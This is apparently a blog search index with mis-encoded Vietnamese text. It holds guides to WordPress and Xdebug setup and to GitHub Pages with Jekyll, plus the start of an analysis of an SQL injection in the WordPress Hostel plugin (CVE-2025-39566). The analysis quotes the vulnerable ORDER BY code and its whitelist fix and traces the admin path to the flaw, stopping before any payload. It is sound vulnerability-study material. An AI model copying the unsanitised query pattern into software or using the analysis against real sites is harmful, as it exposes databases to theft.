\u0026#39;\u0026lt;your-password\u0026gt;\u0026#39;; Query OK, 1 row affected (0,00 sec) -- C·∫•p quy·ªÅn cho user WordPress mysql\u0026gt; GRANT SELECT,INSERT,UPDATE,DELETE,CREATE,DROP,ALTER ON wordpress.* TO wordpress@localhost; Query OK, 1 row affected (0,00 sec) -- L√†m m·ªõi l·∫°i quy·ªÅn mysql\u0026gt; FLUSH PRIVILEGES; Query OK, 1 row affected (0,00 sec) -- Tho√°t mysql\u0026gt; quit Bye Kh·ªüi ƒë·ªông l·∫°i d·ªãch v·ª•:\nsudo service mysql start Configure WordPress to connect to the database Copy file c·∫•u h√¨nh m·∫´u:\nsudo -u www-data cp /srv/www/wordpress/wp-config-sample.php /srv/www/wordpress/wp-config.php WordPress khi t·∫£i v·ªÅ c√≥ s·∫µn file wp-config-sample.php B·∫°n copy n√≥ th√†nh wp-config.php ƒë·ªÉ l√†m file c·∫•u h√¨nh ch√≠nh cho site Ch·ªânh s·ª≠a th√¥ng tin database:\nsudo -u www-data sed -i \u0026#39;s/database_name_here/wordpress/\u0026#39; /srv/www/wordpress/wp-config.php sudo -u www-data sed -i \u0026#39;s/username_here/wordpress/\u0026#39; /srv/www/wordpress/wp-config.php sudo -u www-data sed -i \u0026#39;s/password_here/\u0026lt;your-password\u0026gt;/\u0026#39; /srv/www/wordpress/wp-config.php ƒê√¢y l√† 3 d√≤ng thay th·∫ø text trong file wp-config.php: database_name_here =\u0026gt; wordpress (t√™n DB ƒë√£ t·∫°o ·ªü b∆∞·ªõc tr∆∞·ªõc) username_here =\u0026gt; wordpress (user MySQL ƒë√£ t·∫°o) password_here =\u0026gt; \u0026lt;your-password\u0026gt; (password ƒë√£ set) Khi Apache ch·∫°y WordPress, n√≥ s·∫Ω ƒë·ªçc file n√†y ƒë·ªÉ bi·∫øt d√πng user n√†o + DB n√†o ƒë·ªÉ k·∫øt n·ªëi MySQL Th√™m Secret Keys v√† Salts:\nsudo -u www-data nano /srv/www/wordpress/wp-config.php üëâ ƒê√¢y l√† chu·ªói b√≠ m·∫≠t m√† WordPress d√πng ƒë·ªÉ:\nM√£ h√≥a session cookies Sinh ra token (nonce) ch·ªëng CSRF NgƒÉn ch·∫∑n t·∫•n c√¥ng ki·ªÉu ‚Äúknown secret‚Äù (v√≠ d·ª• k·∫ª t·∫•n c√¥ng ƒëo√°n ƒë∆∞·ª£c secret m·∫∑c ƒë·ªãnh ƒë·ªÉ gi·∫£ m·∫°o login) define( \u0026#39;AUTH_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;SECURE_AUTH_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;LOGGED_IN_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;NONCE_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;AUTH_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;SECURE_AUTH_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;LOGGED_IN_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;NONCE_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); Thay ƒë·ªïi n√≥ b·∫±ng c√°c chu·ªói random sau: https://api.wordpress.org/secret-key/1.1/salt/\nConfigure WordPress Truy c·∫≠p http://localhost, ƒë·∫∑t site title, username, password, email cho user admin\nSetup Debug on VSCode ƒê·ªÉ hi·ªÉu ƒë∆∞·ª£c lu·ªìng c·ªßa trang web ch·∫°y v√† x·ª≠ l√≠ ·ªü m·ªói request, ta c·∫ßn ph·∫£i debug n√≥.\nAdd PHP Debug extension on VS Code V√†o Extensions (Ctrl+Shift+X) =\u0026gt; t√¨m PHP Debug (by Felix Becker) =\u0026gt; Install. Extension n√†y k·∫øt n·ªëi v·ªõi Xdebug.\nInstall Xdebug on Ubuntu sudo apt install php-xdebug -y Ki·ªÉm tra c√†i ch∆∞a:\nphp -v N·∫øu c√≥ d√≤ng with Xdebug v3.x.x nghƒ©a l√† ƒë√£ OK.\nConfigure Xdebug sudo nano /etc/php/\u0026lt;version\u0026gt;/apache2/php.ini Th√™m v√†o cu·ªëi file\nzend_extension=xdebug.so xdebug.mode=debug xdebug.start_with_request=yes xdebug.client_host=127.0.0.1 xdebug.client_port=9003 Port m·∫∑c ƒë·ªãnh m·ªõi c·ªßa Xdebug v3 l√† 9003.\nSau ƒë√≥ restart Apache:\nsudo systemctl restart apache2 Configure VSCode launch.json M·ªü th∆∞ m·ª•c ch·ª©a trang web wordpress b·∫±ng VSCode\ncode /srv/www/wordpress Trong VS Code =\u0026gt; Run and Debug (Ctrl+Shift+D) =\u0026gt; t·∫°o file launch.json v·ªõi n·ªôi dung:\n{ \u0026#34;version\u0026#34;: \u0026#34;0.2.0\u0026#34;, \u0026#34;configurations\u0026#34;: [ { \u0026#34;name\u0026#34;: \u0026#34;Listen for Xdebug\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;php\u0026#34;, \u0026#34;request\u0026#34;: \u0026#34;launch\u0026#34;, \u0026#34;port\u0026#34;: 9003, \u0026#34;pathMappings\u0026#34;: { \u0026#34;/srv/www/wordpress\u0026#34;: \u0026#34;${workspaceFolder}\u0026#34; } } ] } pathMappings: √°nh x·∫° th∆∞ m·ª•c trong container/server (/srv/www/wordpress) v·ªÅ th∆∞ m·ª•c local c·ªßa trong VS Code.\nNh∆∞ v·∫≠y l√† ƒë√£ ho√†n th√†nh setup WordPress tr√™n local k·∫øt h·ª£p Debug n√≥ tr√™n VSCode.\nExtend Required Version M·ªói phi√™n b·∫£n WordPress th∆∞·ªùng ƒëi k√®m 1 phi√™n b·∫£n PHP th√≠ch h·ª£p. N√™n ki·ªÉm tra t√≠nh t∆∞∆°ng th√≠ch n√†y ƒë·ªÉ qu√° tr√¨nh setup kh√¥ng b·ªã l·ªói.\nWordPress Auto Update T·ª´ WordPress 3.7 tr·ªü ƒëi (2013), WordPress c√≥ c∆° ch·∫ø t·ª± ƒë·ªông c·∫≠p nh·∫≠t (automatic background updates) cho:\nB·∫£n v√° b·∫£o m·∫≠t (security release). B·∫£n b·∫£o tr√¨ (maintenance release). Kh√¥ng t·ª± ƒë·ªông update major version (tr·ª´ khi b·∫≠t r√µ r√†ng). H·ªá th·ªëng ki·ªÉm tra v·ªõi server api.wordpress.org ƒë·ªÉ xem c√≥ b·∫£n v√° n√†o m·ªõi s·∫Ω t·ª± ƒë·ªông n√¢ng c·∫•p background l√™n. Vi·ªác n√†y di·ªÖn ra r·∫•t nhanh sau khi setup, n√™n b·∫°n th·∫•y code ƒë·ªïi kh√°c so v·ªõi source g·ªëc.\nQu√° tr√¨nh setup di·ªÖn ra khi truy c·∫≠p /wp-admin/install.php\nƒê·ªÉ v√¥ hi·ªáu h√≥a c∆° ch·∫ø c·∫≠p nh·∫≠t t·ª± ƒë·ªông n√†y, th√™m d√≤ng sau v√†o wp-config.php:\ndefine( \u0026#39;WP_AUTO_UPDATE_CORE\u0026#39;, false ); ","permalink":"//localhost:1313/vi/posts/2025-08-21-wordpress-local-and-debugging/","summary":"\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003e\u003cstrong\u003eWordPress\u003c/strong\u003e l√† m·ªôt h·ªá th·ªëng qu·∫£n l√Ω n·ªôi dung (CMS) m·∫°nh m·∫Ω v√† ph·ªï bi·∫øn nh·∫•t cho ph√©p b·∫°n t·∫°o, qu·∫£n l√Ω v√† t√πy ch·ªânh c√°c trang web v√† blog m·ªôt c√°ch d·ªÖ d√†ng. N√≥ l√† open-source CMS, ƒë∆∞·ª£c x√¢y d·ª±ng tr√™n PHP v√† s·ª≠ d·ª•ng c∆° s·ªü d·ªØ li·ªáu MySQL ho·∫∑c Maria DB.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eRa ƒë·ªùi nƒÉm 2003, ban ƒë·∫ßu ch·ªâ ƒë·ªÉ vi·∫øt blog, sau ƒë√≥ ph√°t tri·ªÉn th√†nh n·ªÅn t·∫£ng t·∫°o website, c·ª≠a h√†ng online, di·ªÖn ƒë√†n, landing page‚Ä¶\u003c/li\u003e\n\u003cli\u003eHi·ªán nay, h∆°n 40% website tr√™n th·∫ø gi·ªõi ch·∫°y b·∫±ng WordPress.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eC√≥ 2 phi√™n b·∫£n WordPress:\u003c/p\u003e","title":"WordPress Local and Debugging"},{"content":"Introduction Khi b·∫Øt ƒë·∫ßu t·∫°o blog c√° nh√¢n, c√≥ ba c√¥ng c·ª• b·∫°n c·∫ßn bi·∫øt: GitHub Pages, Jekyll v√† Giscus.\nGithub Pages: D·ªãch v·ª• mi·ªÖn ph√≠ t·ª´ GitHub, cho ph√©p b·∫°n tri·ªÉn khai website tƒ©nh tr·ª±c ti·∫øp t·ª´ repository. Ch·ªâ c·∫ßn push code l√™n GitHub, blog c·ªßa b·∫°n s·∫Ω t·ª± ƒë·ªông xu·∫•t hi·ªán tr√™n Internet m√† kh√¥ng c·∫ßn server ri√™ng.\nJekyll: M·ªôt static site generator t√≠ch h·ª£p s·∫µn v·ªõi GitHub Pages. Jekyll gi√∫p b·∫°n d·ªÖ d√†ng t·∫°o blog t·ª´ c√°c file Markdown, t·ªï ch·ª©c n·ªôi dung b·∫±ng template v√† theme s·∫µn c√≥.\nGiscus: M·ªôt h·ªá th·ªëng b√¨nh lu·∫≠n hi·ªán ƒë·∫°i d·ª±a tr√™n GitHub Discussions. Thay v√¨ ph·∫£i d√πng d·ªãch v·ª• ngo√†i nh∆∞ Disqus, b·∫°n c√≥ th·ªÉ t·∫≠n d·ª•ng GitHub ƒë·ªÉ qu·∫£n l√Ω comment, v·ª´a g·ªçn nh·∫π v·ª´a th√¢n thi·ªán v·ªõi developer.\nRequirements T√†i kho·∫£n Github Ki·∫øn th·ª©c c∆° b·∫£n v·ªÅ Markdown Creating a Site Repository ·ªû ƒë√¢y, t√¥i s·ª≠ d·ª•ng Chirpy themes, ƒë√¢y l√† theme kh√° n·ªïi ti·∫øng d√†nh cho GitHub Pages, ƒë∆∞·ª£c t·ªëi ∆∞u cho vi·ªác vi·∫øt blog c√° nh√¢n ho·∫∑c technical blog.\nC√°c b∆∞·ªõc th·ª±c hi·ªán:\nƒêƒÉng nh·∫≠p v√†o Github v√† di chuy·ªÉn ƒë·∫øn starter Thay v√¨ Fork, ta click Use this template v√† ch·ªçn Create a new repository ƒë·ªÉ t·ª± ƒë·ªông t·∫°o Site Repository. ƒê·∫∑t t√™n cho Repository m·ªõi \u0026lt;username\u0026gt;.github.io, thay ƒë·ªïi \u0026lt;username\u0026gt; th√†nh Github username c·ªßa b·∫°n. Setting up the Environment C√≥ 2 l√Ω do ch√≠nh b·∫°n n√™n setup m√¥i tr∆∞·ªùng tr√™n m√°y local khi ph√°t tri·ªÉn blog:\nSau khi push code l√™n Repository, GitHub Actions s·∫Ω m·∫•t m·ªôt kho·∫£ng th·ªùi gian ƒë·ªÉ ch·∫°y r·ªìi m·ªõi build v√† render ra GitHub Pages. Khi dev tr·ª±c ti·∫øp tr√™n local, b·∫°n c√≥ th·ªÉ quan s√°t k·∫øt qu·∫£ ngay l·∫≠p t·ª©c, nhanh h∆°n v√† thu·∫≠n ti·ªán h∆°n. Using Dev Containers (Recommended for Windows) Dev Containers cung c·∫•p m·ªôt m√¥i tr∆∞·ªùng c√¥ l·∫≠p b·∫±ng Docker, gi√∫p tr√°nh xung ƒë·ªôt v·ªõi h·ªá th·ªëng v√† ƒë·∫£m b·∫£o m·ªçi dependency ƒë·ªÅu ƒë∆∞·ª£c qu·∫£n l√Ω trong container.\nC√°c b∆∞·ªõc th·ª±c hi·ªán:\nC√†i ƒë·∫∑t Docker: Tr√™n Windows/macOS: c√†i Docker Desktop. Tr√™n Linux: c√†i Docker Engine. C√†i VS Code v√† extension Dev Containers. Clone repository: N·∫øu d√πng Docker Desktop: m·ªü VS Code v√† clone repo trong container volume. N·∫øu d√πng Docker Engine: clone repo v·ªÅ local, sau ƒë√≥ m·ªü b·∫±ng container trong VS Code. Ch·ªù qu√° tr√¨nh thi·∫øt l·∫≠p Dev Containers ho√†n t·∫•t. Setting up Natively (Recommended for Unix-like OS) V·ªõi c√°c h·ªá ƒëi·ªÅu h√†nh d·∫°ng Unix-like (Linux, macOS), b·∫°n c√≥ th·ªÉ setup m√¥i tr∆∞·ªùng tr·ª±c ti·∫øp (native) ƒë·ªÉ ƒë·∫°t hi·ªáu nƒÉng t·ªët nh·∫•t. Ngo√†i ra, v·∫´n c√≥ th·ªÉ d√πng Dev Containers nh∆∞ m·ªôt l·ª±a ch·ªçn thay th·∫ø.\nC√°c b∆∞·ªõc th·ª±c hi·ªán:\nL√†m theo h∆∞·ªõng d·∫´n c√†i ƒë·∫∑t Jekyll v√† ƒë·∫£m b·∫£o ƒë√£ c√†i ƒë·∫∑t Git. Clone repository v·ªÅ m√°y local. N·∫øu b·∫°n fork theme, c√†i Node.js v√† ch·∫°y bash tools/init.sh trong th∆∞ m·ª•c g·ªëc ƒë·ªÉ kh·ªüi t·∫°o repo. Ch·∫°y l·ªánh d∆∞·ªõi ƒë√¢y ·ªü th∆∞ m·ª•c g·ªëc ƒë·ªÉ to√†n b·ªô gem s·∫Ω ƒë∆∞·ª£c c√†i v√†o ./vendor/bundle/ trong project, kh√¥ng c·∫ßn sudo v√† kh√¥ng ƒë·ª•ng g√¨ ƒë·∫øn /var/lib/gems.. bundle config set --local path \u0026#39;vendor/bundle\u0026#39; bundle install Usage Start the Jekyll Server ƒê·ªÉ ch·∫°y site tr√™n local, s·ª≠ d·ª•ng l·ªánh d∆∞·ªõi ƒë√¢y:\nbundle exec jekyll s Configuration M·ªôt s·ªë bi·∫øn c·∫ßn c·∫•u h√¨nh trong _config.yml, bao g·ªìm:\nlang: Set language cho website c·ªßa b·∫°n url: Tr·ªè ƒë·∫øn website c·ªßa b·∫°n title: Title ch√≠nh, n·∫±m d∆∞·ªõi avatar tagline: Subtitle, m√¥ t·∫£ trang web avatar: h·ªó tr·ª£ local v√† CORS resources, c√≥ th·ªÉ s·ª≠ d·ª•ng gif Comment feature via Giscus Ta s·ª≠ d·ª•ng Giscus l√†m h·ªá th·ªëng comment cho website, ngo√†i ra c√≤n c√°c option kh√°c nh∆∞: Disqus, Utterances, t·∫•t c·∫£ ƒë·ªÅu mi·ªÖn ph√≠.\nC√°c b∆∞·ªõc th·ª±c hi·ªán:\nC√†i ƒë·∫∑t giscus v√†o Github. V√†o Settings c·ªßa repository ch·ªçn General v√† b·∫≠t Discussions ƒë·ªÉ giscus l∆∞u comments v√†o Discussions. Nh·∫≠p repository \u0026lt;username\u0026gt;/\u0026lt;username\u0026gt;.github.io, th√¥ng b√°o m√†u xanh l√° xu·∫•t hi·ªán khi c√°c ti√™u ch√≠ ·ªü tr√™n ƒë∆∞·ª£c ƒë√°p ·ª©ng. Ch·ªçn th·ªÉ lo·∫°i discussion v√† ch·ªß ƒë·ªÅ cho website. C·∫•u h√¨nh giscus trong _config.yml provider: ch·ªçn giscus giscus: mapping c√°c bi·∫øn t∆∞∆°ng ·ª©ng ƒë√£ l√†m ·ªü giscus v√†o bi·∫øn giscus. Customize the Favicon T·∫°o favicon ri√™ng cho website c·ªßa b·∫°n, kh√¥ng ph·∫£i s·ª≠ d·ª•ng favicon m·∫∑c ƒë·ªãnh c·ªßa themes\nC√°c b∆∞·ªõc th·ª±c hi·ªán:\nTruy c·∫≠p Favicon Genarate Click Browse ch·ªçn favicon c·∫ßn t·∫°o, sau ƒë√≥ click Create Favicon ƒë·ªÉ t·∫°o. Click Download the generated favicon ƒë·ªÉ t·∫£i c√°c file ch·ª©a c√°c favicon v·ªÅ. Gi·∫£i n√©n file v·ª´a t·∫£i, x√≥a 2 file d∆∞·ªõi ƒë√¢y: browserconfig.xml site.webmanifest Copy to√†n b·ªô file c√≤n l·∫°i v√† paste v√†o assets/img/favicons(n·∫øu ch∆∞a c√≥ th√¨ t·∫°o). Extends Remove meta tag in Footer C√≥ th·ªÉ x√≥a d√≤ng Using the Chirpy theme for Jekyll. b·∫±ng c√°c b∆∞·ªõc sau:\nT·∫°o file theo ƒë∆∞·ªùng d·∫´n sau _data/locales/en.yml. Copy n·ªôi dung en.yml v√† d√°n v√†o file v·ª´a t·∫°o. S·ª≠a n·ªôi dung bi·∫øn meta th√†nh \u0026quot;\u0026quot; Write a post Tham kh·∫£o rule ƒë·ªÉ vi·∫øt blog c·ªßa themes v√† s·ª≠ d·ª•ng Live Preview ƒë·ªÉ quan s√°t\n","permalink":"//localhost:1313/vi/posts/2025-08-19-github-pages-with-jekyll-themes-and-giscus/","summary":"\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eKhi b·∫Øt ƒë·∫ßu t·∫°o blog c√° nh√¢n, c√≥ ba c√¥ng c·ª• b·∫°n c·∫ßn bi·∫øt: GitHub Pages, Jekyll v√† Giscus.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eGithub Pages\u003c/strong\u003e: D·ªãch v·ª• mi·ªÖn ph√≠ t·ª´ GitHub, cho ph√©p b·∫°n tri·ªÉn khai website tƒ©nh tr·ª±c ti·∫øp t·ª´ repository. Ch·ªâ c·∫ßn push code l√™n GitHub, blog c·ªßa b·∫°n s·∫Ω t·ª± ƒë·ªông xu·∫•t hi·ªán tr√™n Internet m√† kh√¥ng c·∫ßn server ri√™ng.\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eJekyll\u003c/strong\u003e: M·ªôt static site generator t√≠ch h·ª£p s·∫µn v·ªõi GitHub Pages. Jekyll gi√∫p b·∫°n d·ªÖ d√†ng t·∫°o blog t·ª´ c√°c file Markdown, t·ªï ch·ª©c n·ªôi dung b·∫±ng template v√† theme s·∫µn c√≥.\u003c/p\u003e","title":"Github Pages with Jekyll themes and Giscus"},{"content":"L·ªó h·ªïng trong plugin Hostel tr∆∞·ªõc phi√™n b·∫£n 1.1.5.7. Do vi·ªác l√†m s·∫°ch d·ªØ li·ªáu kh√¥ng ƒë√∫ng c√°ch, ƒëi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin.\nCVE ID: CVE-2025-39566 Product: WordPress Hostel Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt;= 1.1.5.6 CVSS severity: 7.6 (High) Required Privilege: Administrator Requirements Local WordPress and Debugging Hostel Plugin: v1.1.5.6(vul) v√† v1.1.5.7(fix) diff tool: meld ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th√°y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version Analysis Nguy√™n nh√¢n c·ªë l√µi do ·ª©ng d·ª•ng ch√®n tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ GET request v√†o SQL query m√† c∆° ch·∫ø ki·ªÉm so√°t kh√¥ng ch·∫∑t ch·∫Ω.\nPatch Diff D√πng diff tool b·∫•t k√¨ ƒë·ªÉ so s√°nh s·ª± kh√°c bi·ªát gi·ªØa b·∫£n l·ªói v√† b·∫£n v√°. C√≥ s·ª± kh√°c bi·ªát r√µ ·ªü file controllers/bookings.php\nB·∫£n l·ªó h·ªïng:\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } B·∫£n v√°:\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) { $ob = sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]); if(!in_array($ob, [\u0026#39;tB.id\u0026#39;, \u0026#39;tB.contact_name\u0026#39;, \u0026#39;tB.contact_email\u0026#39;, \u0026#39;tB.from_date\u0026#39;, \u0026#39;tB.amount_paid\u0026#39;, \u0026#39;tB.status\u0026#39;])) { $ob = \u0026#39;tB.id\u0026#39;; } $orderby = \u0026#34;ORDER BY $ob $dir\u0026#34;; } üëâ B·∫£n v√° s·ª≠ d·ª•ng whitelist ƒë·ªÉ gi·ªõi h·∫°n c√°c c·ªôt c√≥ th·ªÉ ƒë∆∞·ª£c s·∫Øp x·∫øp, n·∫øu kh√¥ng h·ª£p l·ªá tr·∫£ v·ªÅ 'tB.id'.\nAnalysis: L·ªó h·ªïng xu·∫•t hi·ªán khi param ob ƒë∆∞·ª£c truy·ªÅn tr·ª±c ti·∫øp v√†o m·ªánh ƒë·ªÅ ORDER BY th√¥ng qua h√†m sanitize_text_field(), ch·ªâ escape m√† kh√¥ng filter SQLi.\nHow it work? ƒê·ªÉ inject ƒë∆∞·ª£c, ta c·∫ßn ph·∫£i x√°c ƒë·ªãnh to√†n b·ªô c√¢u query ƒë∆∞·ª£c ƒë∆∞·ª£c s·ª≠ d·ª•ng ·ªü ƒë√¢y\n$bookings = $wpdb-\u0026gt;get_results(\u0026#34;SELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM \u0026#34;.WPHOSTEL_BOOKINGS.\u0026#34; tB JOIN \u0026#34;.WPHOSTEL_ROOMS.\u0026#34; tR ON tR.id = tB.room_id WHERE is_static=0 $where_sql $orderby $limit_sql\u0026#34;); C√¢u query n·∫±m trong nh√°nh default c·ªßa c·∫•u tr√∫c switch.\nTo√†n b·ªô ƒëo·∫°n x·ª≠ l√Ω na·ª≥ thu·ªôc v·ªÅ h√†m static manage() c·ªßa class WPHostelBookings.\nclass WPHostelBookings { static function manage() { global $wpdb; $_booking = new WPHostelBooking(); switch(@$_GET[\u0026#39;do\u0026#39;]) { case \u0026#39;add\u0026#39;: // add handle break; case \u0026#39;edit\u0026#39;: // edit handle break; // view/print booking details. Will allow also to confirm/cancel case \u0026#39;view\u0026#39;: // view handle\tbreak;\t// list bookings default: // another logic if(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } $bookings = $wpdb-\u0026gt;get_results(\u0026#34;SELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM \u0026#34;.WPHOSTEL_BOOKINGS.\u0026#34; tB JOIN \u0026#34;.WPHOSTEL_ROOMS.\u0026#34; tR ON tR.id = tB.room_id WHERE is_static=0 $where_sql $orderby $limit_sql\u0026#34;); // another logic break; } } } Trong WordPress, plugin giao ti·∫øp v·ªõi core th√¥ng qua Plugin API (Hook System). Do ƒë√≥, ƒë·ªÉ x√°c ƒë·ªãnh n∆°i h√†m manage() ƒë∆∞·ª£c g·ªçi, ta c√≥ th·ªÉ t√¨m ki·∫øm t·ª´ kh√≥a \u0026quot;manage\u0026quot; trong th∆∞ m·ª•c ch·ª©a plugin.\nTrong file models/hostel.php ta c√≥ h√†m:\nclass class WPHostel { // another logic static function menu() { // we use \u0026#39;hostelpro_manage\u0026#39; for consistency with the pro version $wphostel_caps = current_user_can(\u0026#39;manage_options\u0026#39;) ? \u0026#39;manage_options\u0026#39; : \u0026#39;hostelpro_manage\u0026#39;; add_menu_page(__(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#39;Settings\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Settings\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Rooms\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Rooms\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_rooms\u0026#39;, array(\u0026#39;WPHostelRooms\u0026#39;, \u0026#34;manage\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_bookings\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Unavailable Dates\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Unavailable Dates\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_unavailable\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;unavailable\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Email Log\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Email Log\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_emaillog\u0026#39;, array(\u0026#39;WPHostelHelp\u0026#39;, \u0026#34;email_log\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Help\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Help\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_help\u0026#39;, array(\u0026#39;WPHostelHelp\u0026#39;, \u0026#34;index\u0026#34;)); } // another logic } ·ªû ƒë√¢y:\nadd_menu_page() t·∫°o menu ch√≠nh trong Admin Dashboard. add_submenu_page() th√™m c√°c submenu con cho menu ƒë√≥. Tham s·ªë $callback l√† m·ªôt callback function s·∫Ω ƒë∆∞·ª£c g·ªçi khi ng∆∞·ªùi d√πng click v√†o menu/submenu. V√≠ d·ª•:\n// add_menu_page($page_title, $menu_title, $capability, $menu_slug, $callback = \u0026#39;\u0026#39;, $icon_url = \u0026#39;\u0026#39;, $position = null); add_menu_page(__(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); // add_submenu_page($parent_slug, $page_title, $menu_title, $capability, $menu_slug, $callback = \u0026#39;\u0026#39;); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_bookings\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); // array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); =\u0026gt; WPHostelBookings::manage() T·∫•t c·∫£ menu/submenu n√†y ƒë·ªÅu ƒë∆∞·ª£c ƒëƒÉng k√Ω b√™n trong h√†m static menu() c·ªßa class WPHostel. Do ƒë√≥, ƒë·ªÉ x√°c ƒë·ªãnh n∆°i h√†m menu() ƒë∆∞·ª£c g·ªçi, ta c√≥ th·ªÉ t√¨m ki·∫øm t·ª´ kh√≥a menu trong th∆∞ m·ª•c ch·ª©a plugin.\nTrong file hostel.php ·ªü th∆∞ m·ª•c g·ªëc c·ªßa plugin ta c√≥:\nadd_action(\u0026#39;admin_menu\u0026#39;, array(\u0026#34;WPHostel\u0026#34;, \u0026#34;menu\u0026#34;)); // =\u0026gt; callback: WPHostel::menu() add_action() l√† m·ªôt Plugin API c·ªßa WordPress, cho ph√©p g·∫Øn m·ªôt callback v√†o m·ªôt action hook. Hook name ·ªü ƒë√¢y l√† admin_menu, nghƒ©a l√† h√†m WPHostel::menu() s·∫Ω ƒë∆∞·ª£c g·ªçi trong v√≤ng ƒë·ªùi khi WordPress d·ª±ng Admin Dashboard Menu. Menu tr√™n UI Admin Dashboard\nDebugging\nCh·ª©c nƒÉng b·ªã l·ªói n·∫±m trong Booking Manager, v√¨ v·∫≠y ta truy c·∫≠p v√†o submenu Manager Bookings tr√™n UI Admin Dashboard. Ngay tr∆∞·ªõc nh√°nh default c√≥ comment // list bookings =\u0026gt; cho th·∫•y ƒëo·∫°n code n√†y x·ª≠ l√Ω vi·ªác li·ªát k√™ v√† s·∫Øp x·∫øp bookings M·ªü debugger: Click Run with Debugger. ƒê·∫∑t breakpoint t·∫°i nh√°nh switch ch·ª©a code l·ªói v√† t·∫°i d√≤ng code g√¢y l·ªói. Khi click v√†o m·ªôt c·ªôt trong b·∫£ng bookings, quan s√°t: Debugger nh·∫£y v√†o c·∫•u tr√∫c switch. D√πng Step Over, debugger ƒëi ti·∫øp v√†o nh√°nh default. Ti·∫øp t·ª•c Step Over v√† theo d√µi gi√° tr·ªã bi·∫øn trong tab Variables \u0026gt; Locals. C√°c bi·∫øn n√†y s·∫Ω k·∫øt h·ª£p ƒë·ªÉ t·∫°o th√†nh c√¢u SQL b√™n d∆∞·ªõi. Sau khi gh√©p c√°c bi·∫øn, c√¢u query ƒë·∫ßy ƒë·ªß c√≥ 